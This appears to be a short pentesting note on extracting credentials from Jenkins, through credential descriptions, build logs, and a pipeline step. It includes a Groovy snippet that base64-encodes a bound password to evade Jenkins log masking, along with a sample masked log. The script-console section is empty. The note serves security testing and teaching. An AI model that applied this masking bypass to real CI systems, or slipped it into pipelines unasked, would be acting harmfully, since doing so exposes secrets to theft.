# Credentials Dumping

## Credentials in Text fields in Credentials List
- We can find the list of credentials name and id at http://host:ip/credentials/
- While this sounds very hypothetical, it is very much real to find credentials in text and name section.
- Possible reason for rewriting credentials in credentials description makes it easier to remember purpose, or for making debugging easy.

## Dumping credentials from logs

- Build logs are generated from the build output.
- In certain cases depending on how the pipeline is created, credentials can get logged in the build output
<img src="buildlog-password1.png">

## Credentials Dumping from pipeline


- Credentials Bindings ( https://www.jenkins.io/doc/pipeline/steps/credentials-binding/ )
``` Groovy
stages {
        stage('Curl') {
            steps {
                withCredentials(
                    [usernamePassword(credentialsId: 'mycredentials', usernameVariable: 'user', passwordVariable : 'pass')]
                ) {
                    sh '''
                        echo "$pass" | base64
                    '''
                }
            }
        }
```
- When used without base64
```
[Pipeline] stage
[Pipeline] { (Curl)
[Pipeline] withCredentials
Masking supported pattern matches of $user or $pass
[Pipeline] {
[Pipeline] sh
+ echo ****
****
[Pipeline] }
[Pipeline] // withCredentials
[Pipeline] }
[Pipeline] // stage
```

## Credentials Dumping from Script Console
